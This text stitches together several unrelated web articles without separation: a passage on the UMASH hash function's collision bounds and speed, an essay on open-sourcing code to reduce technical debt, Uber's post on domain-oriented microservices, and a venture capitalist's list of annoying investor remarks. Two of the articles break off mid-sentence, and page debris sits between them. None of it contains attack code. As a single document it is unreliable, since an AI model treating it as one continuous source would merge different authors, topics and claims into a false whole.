<a href="https://burtleburtle.net/bob/hash/spooky.html">SpookyHash</a> (11.6 GB/s).</p><p>What sets UMASH apart from these other non-cryptographic hash
functions is its proof of a collision probability bound. In the
absence of an adversary that adaptively constructs pathological inputs
as it infers more information about the randomly chosen parameters, we
know that two distinct inputs of \(s\) or fewer bytes will have the
same 64-bit hash with probability at most \(\lceil s / 2048 \rceil
\cdot 2^{-56},\) where the expectation is taken over the random
“key” parameters.</p><p>Only one non-cryptographic hash function in
<a href="https://github.com/rurban/smhasher">Reini Urban’s fork of SMHasher</a>
provides this sort of bound: <a href="https://github.com/lemire/clhash">CLHash</a>
<a href="https://arxiv.org/abs/1503.03465">guarantees a collision probability \(\approx 2^{-63}\)</a>
in the same
<a href="https://en.wikipedia.org/wiki/Universal_hashing#Mathematical_guarantees">universal hashing</a>
model as UMASH. While CLHash’s peak throughput (22 GB/s) is
equal to UMASH’s, its latency on short inputs is worse (23-25 ns
instead of 9-22ns). We will also see that its stronger collision
bound remains too weak for many practical applications. In order to
compute a <a href="https://en.wikipedia.org/wiki/Fingerprint_(computing)">fingerprint</a>
with CLHash, one would have to combine multiple hashes, exactly like
we did for the 128-bit UMASH fingerprint.</p><p>Actual cryptographic hash functions provide stronger bounds in a much
more pessimistic model; however they’re also markedly slower than
non-cryptographic hashes. <a href="https://github.com/BLAKE3-team/BLAKE3">BLAKE3</a>
needs at least 66 ns to hash short inputs, and achieves a peak throughput
of 5.5 GB/s. Even the <a href="https://github.com/rust-lang/rust/issues/29754">reduced-round SipHash-1-3</a>
hashes short inputs in 18-40 ns and longer ones at a peak throughput
of 2.8 GB/s. That’s the price of their pessimistically adversarial
security model. Depending on the application, it can make sense to
consider a more restricted adversary that must prepare its dirty deed
before the hash function’s parameters are generated at random, and
still ask for provable bounds on the probability of collisions.
That’s the niche we’re targeting with UMASH.</p><p>Clearly, the industry is comfortable with no bound at all.
However, even in the absence of
<a href="https://www.131002.net/siphash/#at">seed-independent collisions</a>,
timing side-channels in a data structure implementation could
theoretically leak information about colliding inputs, and iterating
over a hash table’s entries to print its contents can divulge even more
bits. A sufficiently motivated adversary could use something like
that to learn more about the key and deploy an algorithmic denial of
service attack. For example, the linear structure of UMASH (and of
other polynomial hashes like CLHash) makes it easy to combine known
collisions to create exponentially more colliding inputs. There is no
universal answer; UMASH is simply another point in the solution space.</p><p>If reasonable performance coupled with an actual bound on collision
probability <em>for data that does not adaptively break the hash</em> sounds
useful to you,
<a href="https://github.com/backtrace-labs/umash">take a look at UMASH on GitHub</a>!</p><p>The <a href="#but-why">next section</a> will explain why we found it useful to
design another hash function. The rest of the post
<a href="#umash-high-level">sketches how UMASH works</a> and
<a href="#implementation-tricks">how it balances short-input latency and strength</a>,
before <a href="#usage">describing a few interesting usage patterns.</a></p><p><small>The latency and throughput results above were all measured on
the same unloaded 2.5 GHz Xeon 8175M. While we did not disable
frequency scaling (#cloud), the clock rate seemed stable at 3.1
GHz during our run.</small></p><h2 id="a-idbut-whyahow-did-we-even-get-here"><a id="but-why"></a>How did we even get here?</h2><p>Engineering is the discipline of satisficisation: crisply defined
problems with perfect solutions rarely exist in reality, so we must
resign ourselves to satisfying approximate constraint sets “well
enough.” However, there are times when all options are not only
imperfect, but downright sucky. That’s when one has to put on a
different hat, and question the problem itself: are our constraints
irremediably at odds, or are we looking at an under-explored
solution space?</p><p>In the former case, we simply have to want something else. In the
latter, it might make sense to spend time to really understand the
current set of options and hand-roll a specialised approach.</p><p>That’s the choice we faced when we started caching intermediate
results in
<a href="https://help.backtrace.io/en/articles/2428859-web-console-overview">Backtrace’s database</a>
and found a dearth of acceptable hash functions. Our in-memory
columnar database is a core component of the backend, and, like most
analytics databases, it tends to process streams of similar queries.
However, a naïve query cache would be ineffective: our more heavily
loaded servers handle a constant write load of more than 100 events
per second with dozens of indexed attributes (populated column values)
each. Moreover, queries invariably select a large number of data
points with a time windowing predicate that excludes old data… and
the endpoints of these time windows advance with each wall-clock
second. The queries evolve over time, and must usually consider newly
ingested data points.</p><p><a href="https://www.gsd.inesc-id.pt/~rodrigo/slider_middleware14.pdf">Bhatotia et al’s Slider</a>
show how we can specialise the idea of
<a href="http://adapton.org/">self-adjusting or incremental computation</a>
for repeated MapReduce-style queries over a sliding window.
The key idea is to split the data set at stable boundaries (e.g., on
date change boundaries rather than 24 hours from the beginning of the
current time window) in order to expose memoisation opportunities, and
to do so recursively to repair around point mutations to older data.</p><p>Caching fully aggregated partial results works well for static
queries, like scheduled reports… but the first step towards creating
a great report is interactive data exploration, and that’s an activity
we strive to support well, even when drilling down tens of millions of
rich data points. That’s why we want to also cache intermediate
results, in order to improve response times when tweaking a saved
report, or when crafting ad hoc queries to better understand how and
when an application fails.</p><p>We must go back to a
<a href="http://www.umut-acar.org/self-adjusting-computation">more general incremental computation strategy</a>:
rather than only splitting up inputs, we want to stably partition the
data dependency graph of each query, in order to identify shared
subcomponents whose results can be reused. This finer grained
strategy surfaces opportunities to “resynchronise” computations, to
recognize when different expressions end up generating a subset of
identical results, enabling reuse in later steps. For example, when
someone updates a query by adding a selection predicate that only
rejects a small fraction of the data, we can expect to reuse some of
the post-selection work executed for earlier incarnations of the
query, if we remember to key on the selected data points rather than
the predicates.</p><p>The complication here is that these intermediate results tend to be
large. Useful analytical queries start small (a reasonable query
coupled with cache/transaction invalidation metadata to stand in for
the full data set), grow larger as we select data points, arrange them
in groups, and materialise their attributes, and shrink again at the
end, as we summarise data and throw out less interesting groups.</p><p>When caching the latter shrinking steps, where resynchronised reuse
opportunities abound and can save a lot of CPU time, we often
find that storing a fully materialised representation of the cache key
would take up more space than the cached result.</p><p>A classic approach in this situation is to fingerprint cache keys with
a cryptographic hash function like
<a href="https://en.wikipedia.org/wiki/BLAKE_(hash_function)">BLAKE</a>
or <a href="https://en.wikipedia.org/wiki/SHA-3">SHA-3</a>, and store a
compact (128 or 256 bits) fingerprint instead of the cache key: the
probability of a collision is then so low that we might as well assume
any false positive will have been caused by a bug in the code or a
hardware failure. For example,
<a href="https://users.ece.cmu.edu/~omutlu/pub/memory-errors-at-facebook_dsn15.pdf#page=3">a study of memory errors at Facebook</a>
found that uncorrectable memory errors affect 0.03% of servers each
month. Assuming a generous clock rate of 5 GHz, this means each
clock cycle may be afflicted by such a memory error with probability
\(\approx 2.2\cdot 10^{-20} &gt; 2^{-66}.\) If we can guarantee that
distinct inputs collide with probability significantly less than
\(2^{-66}\), e.g., \(&lt; 2^{-70},\) any collision is far
more likely to have been caused by a bug in our code or by
hardware failure than by the fingerprinting algorithm itself.</p><p>Using cryptographic hashes is certainly safe enough, but requires a lot of
CPU time, and, more importantly, worsens latency on smaller keys (for
which caching may not be that …</p></div></article></div></div>

I used it, I didn’t know I used it. I logged into Linux servers with <a href="https://www.putty.org/" target="_blank" rel="noopener">PuTTy</a> (yes, I was a Windows user), I used an open source text editor, and so on. I was just consuming it, I didn’t really get what it was. I just thought “this is great, AND free!”</p><p id="d330">Years later I got a job at a company called Rareface as the Head of Development. I’d come from a long line of Windows-based agency jobs, writing closed-source software in Microsoft development environments, or using proprietary CMS like SharePoint to deliver content.</p><p id="37b1">Rareface were having a hard time. They’d asked a company in Shoreditch to build them <a href="https://en.wikipedia.org/wiki/Myspace" target="_blank" rel="noopener">MySpace</a> in a box for £80,000. The company in Shoreditch foolishly agreed, and nobody did the maths. Nobody asked the fundamental question: If MySpace’s platform has had tens of millions of dollars invested in it, how on Earth do we think we’re going to build something decent for £80,000?</p><p id="262c">Of course, you can’t. So the inevitable happened. Rareface and the other company started to fall out, I was stuck in the middle, ostensibly ‘responsible’ for the platform with no influence over the original contract. I spoke with a colleague called Bernard (a damned good programmer), about what to do.</p><p id="4111">He knew a lot about open source software. He suggested that while a little company couldn’t make a MySpace, the open source software community could harness the kind of development resource MySpace has in spades.</p><p id="9bc9">We looked and reviewed half a dozen open source CMS and, after some debate we chose <a href="https://www.drupal.org/" target="_blank" rel="noopener">Drupal</a> (which at the time sold itself as ‘community plumbing’ — perfect!) It then became my job to go to the senior management and investors of Rareface and convince them to allow me to fire the development company in Shoreditch and re-platform us on to Drupal.</p><p id="d2e9"><strong>I succeeded.</strong></p><p id="319d">We let the other guys go. Which was a pity. They simply bit off more than anyone could chew. I hired a freelance Drupal developer called Mark, who was awesome. He taught the team how to work with Drupal, we created a migration plan, we migrated their key properties over, technically things were going great. Financially, not so much, but that’s another story.</p><p id="92cd">Mainly, I was seeing the power of open source software for the first time. It’s logical, if you think about it. If open source software gets its governance right, you’re talking about people collaboratively writing software, making a living while driving forward a product with far more resource than even the largest technology firm can bring to bear. The potential is enormous. Indeed, <a href="https://w3techs.com/technologies/overview/operating_system/all" target="_blank" rel="noopener">not for nothing does most of the Internet run on open source software</a>.</p><p id="6a48">In Drupal we found our MySpace in a box. And the equivalent of tens of millions of dollars <em>had</em> been invested in it. It was simply invested in a different way, it was crowd-sourced, paid for by the customers of the people who worked on the project, in time by the volunteers who did it for fun, etc.</p><p id="9b68">Appetite whetted, but I was still just a consumer. So how do you cross over from being a passive user of open source software to engaging with it, developing it and making your own contributions?</p><p id="2c1d">As an individual, there are loads of ways. You can get involved in documentation or you can help out supporting people new to a system in chat or in support tickets. Most open source software projects have open forums for help and support and you can join associations to give money, you can attend events, you can tell all your friends about a project to help it gain traction. This all helps.</p><p id="6f8b">And that’s how I started. I enjoyed the <a href="https://en.wikipedia.org/wiki/Internet_Relay_Chat" target="_blank" rel="noopener">IRC</a> community, I liked showing people how to do things in <a href="https://www.drupal.org/project/issues/" target="_blank" rel="noopener">the Drupal issue queue</a>. In time I started producing patches to code, fixing bugs I saw while using Drupal modules and giving my fixes back.</p><p id="2c0c">Most people nod sagely at this point, most people kind of get why giving back in this way would help. But let’s introduce another scenario. I want Drupal to do something it’s never done before, so I write a new module to achieve that. And…</p><p id="acc4"><strong>I give it away for free</strong></p><p id="4f84"><em>I’m sorry, wut?!</em></p><p id="0463">I still knew some Microsoft guys and they all thought I was nuts. “Why would you do that? Why wouldn’t you sell it, charge a download fee?”</p><p id="7f9f">And so we arrive at the nitty-gritty.</p><p id="80ec">Open source software developers will give you all kinds of reasons why you should give away your code: it’s the right thing to do for supporting education and developing economies; if you share your code others will use it, improve it and give you back the improvements; it’s just another business model, you’re paid for consultancy rather than a product, and everybody wins; it’s more secure because everyone can see the code and warn you of issues; the open source model reduces business risk, as you can’t be held to ransom; etc.</p><p id="79c9">This is all true. But there’s another huge reason why I continue to push Code Enigma to open source its software, wherever feasible. It all comes down to technical debt.</p><p id="94fa"><strong>So what is technical debt?</strong></p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2404/1*qkOX3ZR9yeUUjExTYClfPA.png" width="1202" height="912" srcset="https://miro.medium.com/max/552/1*qkOX3ZR9yeUUjExTYClfPA.png 276w, https://miro.medium.com/max/1000/1*qkOX3ZR9yeUUjExTYClfPA.png 500w" sizes="500px" data-old-src="https://miro.medium.com/max/60/1*qkOX3ZR9yeUUjExTYClfPA.png?q=20"></p></div></div></div><figcaption>A person with a paper bag on their head with a sad face drawn on it</figcaption></figure><p id="872e">A simplistic explanation would be every time a developer does something quickly, rather than properly (and there may be reasons for this; I’m not implying a developer who does that is bad, it’s often commercially-driven) they introduce a debt that needs to be paid back later. At some point in the future that code they wrote, which they <em>know</em> to be bad but which was required to hit a deadline, needs to be done the right way. We’ve all been there. <em>That’s</em> technical debt.</p><p id="9321">When you write software for a company that will never see the light of day, there’s often little pressure to <em>not</em> make short-term decisions. If you know it’ll never be scrutinised, if you know it’ll never be used again, there’s less pressure to do it properly. There’s less pressure to document it or be careful about code style.</p><p id="3a33">The moment that software is going to be public, all that changes. Let me give you an example of the kinds of things we had to fix, the technical debt we had to deal with, when we decided to open source <a href="https://github.com/codeenigma/deployments" target="_blank" rel="noopener">our continuous integration scripts</a>.(This is pseudo-code).</p><p id="05a5">Our CI scripts are for deploying applications built by our developers to the servers automatically, so developers don’t spend time releasing. We deploy code in the same way for all our customers, but then one day a big customer, let’s call them ACME, wants something different. When our scripts were closed source, this is the sort of thing that used to happen if we were in a hurry, which we often were:</p><pre><span id="36eb">if "acme" in repo:<br>   // do some special stuff<br>else:<br>   // do the usual stuff</span></pre><p id="622c">And that is technical debt! We can’t leave it like that. What if ACME change their mind? We have to go back through the code and remove that statement. What if someone else wants to do the same thing ACME does? Worse, what if someone wants to do another different thing at the same point?</p><p id="4b15">Also, when we open-sourced our CI we could hardly leave ACME’s name in the code! So things like that became more like this:</p><pre><span id="e533">// our client might want to do some special stuff<br>if special_stuff:<br>    run("./my_special_script.py")</span></pre><p id="513b">Now any customer who wants to do something special can include a ‘my_special_script’ script in their repository. This is, of course, a very simplistic example, but you get the idea.</p><p id="ae82">Sure, you can have code review procedures, merge requests, and so on. You can achieve this sort of rigour around technical debt without open-sourcing your software. But staff and management change, there may be business pressure to ignore the procedures in place at any given moment, there are all sorts of reasons why an organisation might choose to live with that kind of technical debt.</p><p id="f6e5">My point is if your code is open source, <em>you simply cannot ignore it</em>.</p><p id="3b94">Open-sourcing our software makes us better developers <em>because</em> we have to think about it. We have to be deliberate and thoughtful by default when we’re planning and writing code, because we intend to make it public.</p><p id="b39f">It also makes us better remote workers, which is important for us, being <a href="https://remotewise.io/companies/code-enigma/" target="_blank" rel="noopener">a proudly 100% remote working company</a>. Open-sourcing everything we do makes our developers automatically familiar with the tools required to work collaboratively over distance. It equips us to direct online conversations, accept input from others, accept writing documentation as a normal thing you <em>just do</em>, work on multiple streams without tripping up, develop stronger workflows, which all makes us better at work too.</p><p id="677d">We also get ‘free’ code review from people who use our code so we get extra eyes on our work. Different perspectives, other ideas, efficiencies we hadn’t thought of, etc.</p></div></div></section><section><div><div><p id="707a"><strong>I assert: open source developers write better code.</strong></p><p id="6be1">They might not even be better developers, but they are ‘freed’ from the short-termism that inevitably creeps into any closed source code, however good the intentions are of those involved, and they are exposed to a world of ideas and techniques that can only improve them.</p><p id="58b4">So my advice to other companies out there in our sector is this:</p><p id="cf1f">If your software is good enough to open source, do it. If it isn’t, you should figure out what you’d have to do to make it open source, because that’ll be all your technical debt. And if it <em>is</em> open source, you should always be using it.</p><p id="6ede">That’s the <em>‘eat your own dog food’</em> part, why would you open-source and maintain something you wouldn’t use yourself?</p><p id="b3cc">Every company should open source as much software as it can. You will write better software automatically.

<p><span>Recently there has been substantial discussion around the downsides of service oriented architectures and microservice architectures in particular. While only a few years ago, many people readily adopted microservice architectures due to the numerous benefits they provide such as flexibility in the form of independent deployments, clear ownership, improvements in system stability, and better separation of concerns, in recent years people have begun to decry microservices for their tendency to greatly increase complexity, sometimes making even </span><a href="https://www.youtube.com/watch?v=y8OnoxKotPQ"><span>trivial features</span></a><span> difficult to build.</span></p>
<p><span>As Uber has grown to around 2,200 critical microservices, we experienced these tradeoffs first hand. Over the last two years, Uber has attempted to reduce microservice complexity while still maintaining the benefits of a microservice architecture. With this blog post we hope to introduce our generalized approach to microservice architectures, which we refer to as “Domain-Oriented Microservice Architecture” (DOMA).</span></p>
<p><span>While it’s been popular in recent years to criticize microservice architectures because of these downsides, few people have advocated an outright rejection of microservice architectures. The operational benefits are too important, and it seems that there are no, or limited, alternatives. </span><b>Our goal with DOMA is to provide a way forward for organizations that want to reduce overall system complexity while maintaining the flexibility associated with microservice architectures.</b></p>
<p><span>This piece explains DOMA, the concerns that led to the adoption of this architecture for Uber, its benefits for platform and product teams, and, finally, some advice for teams who want to adopt this architecture.&nbsp;</span></p>

<h2><span>What is a microservice?</span></h2>
<p><span>Microservices are an extension of service oriented architectures. As opposed to the fairly large “services” of the 2000s, microservices are applications that represent a set of narrowly scoped functionality. These applications are hosted and available over the network and expose a well-defined interface. Other applications call this interface by making a “</span><a href="https://en.wikipedia.org/wiki/Remote_procedure_call"><span>remote procedure call</span></a><span>” (RPC).</span></p>
<p><span>The key characteristic of microservice architecture is the way in which code is hosted, called, and deployed. If we think about large, monolithic applications, they are generally split into encapsulated components with well-defined interfaces. These interfaces would then be called directly in-process as opposed to over the network. In this way, we can start to think of a microservice as a library with a performance hit (network I/O and serialization / deserialization) in order to call any of its functions.</span></p>
<p><span>When we think about microservices this way, we might question why we would adopt a microservice architecture at all. The answer is often </span><i><span>independent deployments and scaling</span></i><span>. With a large, monolithic application, an organization is forced to deploy or release all of their code at once. Each new version of an application can involve numerous changes. Deployments become risky and time consuming. Anyone can bring the whole system down.&nbsp;</span></p>
<p><span>In other words, organizations adopt microservices for an </span><i><span>operational</span></i><span> benefit at the expense of </span><i><span>performance</span></i><span>. Organizations also must take on the cost to maintain the infrastructure necessary to support microservices. In many situations, it turns out, this trade-off makes a lot of sense, but it is also a strong argument against a premature adoption of a microservice architecture.</span></p>

<h2><span>Motivations</span></h2>
<p><span>At Uber, we adopted a microservice architecture because we had (circa 2012-2013) primarily two monolithic services and ran into many of the operational issues that microservices solve.</span></p>
<ul>
<li><b>Availability Risks.</b><span> A single regression within a monolithic code base can bring the whole system (in this case, all of Uber) down.</span></li>
<li><b>Risky, expensive deployments.</b><span> These were painful and time consuming to perform with the frequent need for rollbacks.</span></li>
<li><b>Poor separation of concerns.</b><span> It was difficult to maintain good separations of concerns with a huge code base. In an exponential growth environment, expediency sometimes led to poor boundaries between logic and components.</span></li>
<li><b>Inefficient execution.</b><span> These issues combined made it difficult for teams to execute autonomously or independently.</span></li>
</ul>
<p><span>In other words, as Uber grew from 10s to 100s of engineers with multiple teams owning pieces of the tech stack, the monolithic architecture tied the fate of teams together and made it difficult to operate independently.</span></p>
<p><span>As a result, we adopted a microservice architecture. Ultimately our systems became more </span><i><span>flexible</span></i><span>, which allowed teams to be more </span><i><span>autonomous.</span></i></p>
<ul>
<li><b>System reliability.<span> Overall system reliability goes up in a microservice architecture. A single service can go down (and be rolled back) without taking down the whole system.</span></b></li>
<li><b>Separation of concerns.</b><span> Architecturally, microservice architectures force you to ask the question “why does this service exist?” more clearly defining the roles of different components.</span></li>
<li><b>Clear Ownership.<span> It becomes much clearer who owned what code. Services are typically owned at the individual, team, or org level enabling faster growth.</span></b></li>
<li>Autonomous execution.<span> Independent deployments + clearer lines of ownership unlock autonomous execution by various product and platform teams.</span></li>
<li><strong>Developer Velocity.</strong><span> Teams can deploy their code independently, which enables them to execute at their own pace.</span></li>
</ul>
<p><span>It’s not an exaggeration to say that Uber would not have been able to accomplish the scale and quality of execution that we maintain today without a microservice architecture.</span></p>
<p><span>However, as the company grew even larger, 100s of engineers to 1000s, we began to notice a set of issues associated with greatly increased system </span><i><span>complexity</span></i><span>. With a microservice architecture one trades a single monolithic code base for black boxes whose functionality can change at any time and easily cause unexpected behavior.</span></p>
<p><span>For instance, engineers had to work through around 50 services across 12 different teams in order to investigate the root cause of the problem.</span></p>
<p><span>Understanding dependencies between services can become quite difficult, as calls between services can go many layers deep. A latency spike in the nth dependency can cause a cascade of issues upstream. Visibility into what’s actually happening is impossible without the right tools, making debugging difficult.</span><span><br>

<p><span>In order to build a simple feature an engineer often has to work across multiple services, all of which are owned by different individuals and teams. This requires extensive collaboration with time spent on meetings, design, and code review. The earlier promise of clear lines of service ownership is compromised as teams build code within each other’s services, modify each other’s data models, and even perform deployments on behalf of service owners. Networked monoliths can form, where services that appear to be independent all have to be deployed together to safely perform any change.</span></p>

<p><span>The result is a slower developer experience, instability for service owners, more painful migrations, etc. For organizations that have already adopted a microservice architecture there is no turning back. It becomes a case of “</span><i><span>can’t live with them, can’t live without them</span></i><span>.”&nbsp;</span></p>

<h2><span>Domain-Oriented Microservice Architecture</span></h2>
<p><span>If we can think of microservices as I/O bound libraries and a “microservice architecture” as a large, distributed application then we can use well understood architectures to think about how to organize our code.&nbsp;</span></p>
<p><span>“Domain-Oriented Microservice Architecture” thus draws heavily from established ways to organize code such as </span><a href="https://en.wikipedia.org/wiki/Domain-driven_design"><span>Domain-driven Design</span></a><span>, </span><a href="https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html"><span>Clean Architecture</span></a><span>, </span><a href="https://en.wikipedia.org/wiki/Service-oriented_architecture"><span>Service-Oriented Architecture</span></a><span>, and object- and interface-oriented design patterns. </span><b>We think of DOMA as innovative only insofar as it is a relatively novel way to leverage established design principles in large distributed systems in large organizations.</b></p>
<p><span>The core principles and terminology associated with DOMA are as follows:</span></p>
<ol>
<li><span>Instead of orienting around single microservices, we oriented around collections of related microservices. We call these </span><b>domains.</b></li>
<li><span>We further create collections of domains which we call layers. The layer that the domain belongs to establishes what dependencies the microservices within that domain are allowed to take on. We call this </span><b>layer design.</b></li>
<li><span>We provide clean interfaces for domains that we treat as a single point of entry into the collection. We call these </span><b>gateways.</b></li>
<li><span>Finally, we establish that </span><i><span>each domain should be agnostic to other domains,</span></i><span> which is to say, a domain shouldn’t have logic related to another domain hard coded inside of its code base or data models. Since frequently teams do need to include logic in another team’s domain (for example, custom validation logic or some meta context on a data model), we provide an </span><b>extension architecture</b><span> to support well defined extension points within the domain.</span></li>
</ol>
<p><span>In other words, by providing a systematic architecture, domain gateways, and predefined extension points, DOMA intends to transform microservice architectures from something complex to something comprehensible: a structured set of flexible, reusable, and layered components.&nbsp;</span></p>
<p><span>The rest of this post digs into Uber’s implementation of DOMA, the benefits we’ve seen, and practical advice for companies which might want to adopt this approach.</span></p>

<h2><span>Uber’s Implementation</span></h2>
<h3><span>Domains</span></h3>
<p><span>Uber domains represent a collection of one or more microservices tied to a logical grouping of functionality. A common question in designing a domain is “how big should a domain be?” We give no guidance here. Some domains can include tens of services, some domains only a single service. The important task is to think carefully about the </span><i><span>logical </span></i><span>role of each collection. For instance, our map search services constitute a domain, fare services are a domain, matching platform (matching riders …</span></p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p><span>Today’s blog post is all about the annoying things that VCs commonly say or ask.&nbsp; I did a <a href="https://twitter.com/dunkhippo33/status/1128150604813967360">call out on Twitter this week</a> and these are the VCisms that the crowds have bubbled up as the most annoying things out of a VC’s mouth.</span></p>
<p><strong>1) What if Google Builds It?&nbsp;&nbsp;(<a href="https://twitter.com/pravesh">@pravesh</a>)</strong></p>
<p>This one was cited a LOT by many people on Twitter in various forms! There were variations — e.g. substitute Google with Amazon or Facebook or any other big company.</p>
<p>Admittedly it’s a valid question — what if the 800 lb gorilla in your space does copy you? What is your edge? How will you win?</p>
<p>Here are a couple of answers that may help:</p>
<p>A. Large companies are so large, they aren’t able to prioritize or even care about your “small” opportunity relative to their huge company. In the case of Google specifically, it has actually been shown that building a Google product competitor can actually be a great opportunity.&nbsp; Many people would much prefer to pay for products so that they can get customer support when something goes wrong — a free Google product will never a customer’s calls or emails.</p>
<p>Companies like Mixpanel, Optimizely, Superhuman, and many more have built big businesses by going head-to-head with a free Google product by charging customers and providing a better experience.</p>
<p>So it’s actually&nbsp;<em>validation</em> of your market if Google is interested in your space.</p>
<p>B. Big companies, by definition, are no longer nimble.&nbsp; You, in contrast, are able to run circles around them.&nbsp; Can you prove that you’re nimble by shipping quickly?&nbsp; Can you show that customers love you more than Google?&nbsp; These are concrete things that you can point to in your conversations with VCs.</p>
<p><strong>2) We don’t invest in hardware (only to find out that they led a round for hardware) (<a href="https://twitter.com/PeterJColbert">@peterjcolbert</a>)</strong></p>
<p>This is an interesting one, because you see VCs deviate from their thesis sometimes.&nbsp; (Every VC does it – we’ve done it too.).&nbsp; VCs will often say they don’t invest in hardware.&nbsp; Or ad revenue based models.&nbsp; Or e-commerce.&nbsp; Or in some geography.&nbsp; And then you see a portfolio company on their website that is clearly in one of these categories.</p>
<p><em>You should just ask a VC about it directly.&nbsp;&nbsp;</em></p>
<p>The reason for this is usually along one of these lines:</p>
<p>A. They used to invest in that category but are now over-indexed. Or they invested in that category previously as an angel or with a past fund. I.e. they&nbsp;<em>used to make those investments but no longer do</em>.</p>
<p>This is important to understand, because if the reason the firm is passing is that they are waiting for some liquidity on existing positions in your space, there could potentially still be an opening for an investment later.&nbsp; This is rare, BUT possible – this has happened once to a company that I’ve backed before.</p>
<p>B. They are experimenting outside their thesis. E.g. They may not usually invest in South America, but they may make 1 investment to learn about the market. They may not invest in hardware, but may invest in 2 companies to learn about the space.</p>
<p>Unfortunately, if this is the case, you can try to hard to convince a VC to do more experimentation in that category, but because VCs have mandates — i.e. they have an agreement with their investors that they would focus on investing in certain categories / theses, they will likely not want to deviate *too* much from their thesis.&nbsp; VCs are judged by their investors on whether they end up investing based on the strategy that they claimed they would.</p>
<p>C. They had a special relationship with the founder.</p>
<p>There is nothing you can do about this.&nbsp; People back their friends all the time regardless of what they are building.</p>
<p>I think it’s easy to walk away fuming mad thinking that a firm is filled with hypocrites, but it’s worth just bringing up with a VC:&nbsp;“Hey you mentioned that you don’t do hardware, but I noticed on your website that you’ve invested in X.&nbsp; Am curious how that fits your thesis?” You may not like the response and it may not change anything, but on rare occasion it may open a door for you.</p>
<p><strong>3) I don’t think this can be a venture scale business. (<a href="https://twitter.com/kirbywinfield">@kirbywinfield</a>)</strong></p>
<p>I’m of two minds on this one.</p>
<p>A. There are a lot of companies who seek out venture funding who are actually NOT a good fit for VC investors.&nbsp; Entrepreneurs should be aware of the return profile that VCs are looking for.&nbsp; Loosely speaking, VCs are looking for a minimum of 100x return in the course of 5 years or so.&nbsp; This comes out to achieving roughly $100m runrate within the next 5 years.&nbsp; Is this what you want to do?</p>
<p>B. However, on the flip side, what ideas will be able to achieve $100m runrate in 5 years is tough to say. VCs often have preconceived notions above what can get to this level and what cannot — <em>and they are often wrong</em>. Companies that tend to get overlooked are in categories such as e-commerce, for example.&nbsp; Are you selling a widget that will likely max out at $5m in sales per year?&nbsp; Or are you the next Stitch Fix?</p>
<p>My advice here would be to first understand for yourself if you want to be growing a business that goes to $100m in annual revenue in 5 years (and the work / hiring that will be required to do so). And if so, what do you think that path looks like if everything goes well?&nbsp; How will you get to $2m runrate this year and then more than double your sales each year thereafter?</p>
<p>And if the answer is that you don’t want to run this type of business, there are other avenues of funding.&nbsp; Angel funding, crowdfunding, revenue-based financing are all good channels that are now rapidly growing.</p>
<p><strong>4) But how will you manage being a mom AND running a startup? (<a href="https://twitter.com/HustleFundVC">@hustlefundvc</a>)</strong></p>
<p>Ugh.&nbsp; Are we in the 21st century?&nbsp; Move on from any VC who asks this.&nbsp; It’s not worth it.</p>
<p><strong>5) We’d be interested when we see a bit more traction. (<a href="https://twitter.com/msuster">@msuster</a>)&nbsp;</strong></p>
<p>Ah, the classic ask for more traction.&nbsp; Basically, the VC doesn’t have conviction right now, but maybe, just maybe, more traction would give him/her the conviction to do your deal.&nbsp; The reality is that most investors can’t articulate what level of traction they would want to see in order to invest.&nbsp; Obviously, if you earn $100m in the next 2 months, everyone will be onboard, but what if you get to $100k / mo runrate in the next year — is that interesting?&nbsp; Well…it depends.&nbsp; And unless you are an asshole or a fraudster, VCs always want to preserve optionality to see you in a year and check on your business.</p>
<p>So, although this is a frustrating response, the right way to play this is to triage investors quickly.&nbsp; Put this VC in a “not interested” bucket. Continue to send him/your monthly investor updates, but you’re better off trying to find someone who has conviction today than trying to convince someone to get conviction — even with traction.&nbsp; You just need to meet a lot of investors and triage a lot of investors quickly in order to find the right investors to bring into your company.</p>
<p><strong>6) Maybe you should raise more and grow quicker. (<a href="https://twitter.com/JustinPUSHAS">@justinpushas</a>)</strong></p>
<p>This is just a stupid comment.&nbsp; If a VC really believes in your business, he/she will commit to your round, and will either help you fill your larger round or write a bigger check.&nbsp; But, investors who say things like this without any action are either just oblivious or not helpful, and should just move on from these investors. As we all know, founders who struggle to raise $250k are also going to have a tough time raising $2.5m.</p>
<p>That being said, I would recommend that every founder <a href="https://elizabethyin.com/2016/03/13/you-should-have-4-fundraising-plans/">develop multiple fundraising plans</a>.&nbsp; This will allow you to pitch a different amount of money to bigger or smaller investors with different milestones and goals that you would achieve with different investment sizes. And then if you do receive this question, you can point to a larger fundraising plan and mention that you have thought about a larger plan and are open to raising more money but are also not limited in growth if you cannot raise that amount now.</p>
<p><strong>7) Come back when you have a lead (<a href="https://twitter.com/stefanopep3">@stefanopep3</a>)</strong></p>
<p>The herd of sheep comment!&nbsp; A variation on this is, “I’m committed once you have a lead.” This is a positive way for a VC to say no for now, but if you have enough fundraising traction, then he/she wants to get his/her foot in the door.</p>
<p><span>It’s important to clarify what a VC means by this, though.&nbsp; Does this mean he/she is interested:&nbsp;</span></p>
<ul>
<li><span>When you have most of your round committed? </span></li>
<li><span>Once terms have been set?</span></li>
<li><span>If another investor is taking a board seat and is providing “serious responsibility ” for the investment.&nbsp; (i.e. no party rounds)?</span></li>
</ul>
<p><span>This is important to clarify, because VCs mean different things when they ask about a lead VC.&nbsp; </span></p>
<p><span>If it’s the former — come back when most of the round is committed — you can build your round in many different ways.&nbsp; You can bring together a party round of smaller investors without a lead on a convertible note or SAFE.&nbsp; It’s actually quite common these days for a smaller fund to set terms on a note or a SAFE and bring together a round that way.&nbsp;&nbsp;</span></p>
<p><span>And if a VC is just looking to evaluate terms, then you can create your own terms on a note or a SAFE and present those to the VC.&nbsp;</span></p>
<p>And lastly, if the VC is looking for a true “lead VC” to invest the majority of the round and take a board seat, etc, then this is a completely different ask from the prior two.</p>
<p><strong><span>8) Let me know how I can help!&nbsp; Founder asks for help. *crickets* (<a href="https://twitter.com/Quan">@quan</a>)</span></strong></p>
<p>When I started my VC career, I asked this question to a few entrepreneurs I met with.&nbsp; I genuinely wanted to be helpful.&nbsp; Then I quickly realized that there was literally nothing I could help with.&nbsp; Hah.&nbsp; Every founder just wanted investment dollars, and if I weren’t investing, I couldn’t even do introductions to other investors, because it would be a bad signal.</p>
<p><strong>9) Nothing. They ghost you. (<a href="https://twitter.com/ameetshah">@ameetshah</a>)</strong></p>
<p>*crickets*</p>
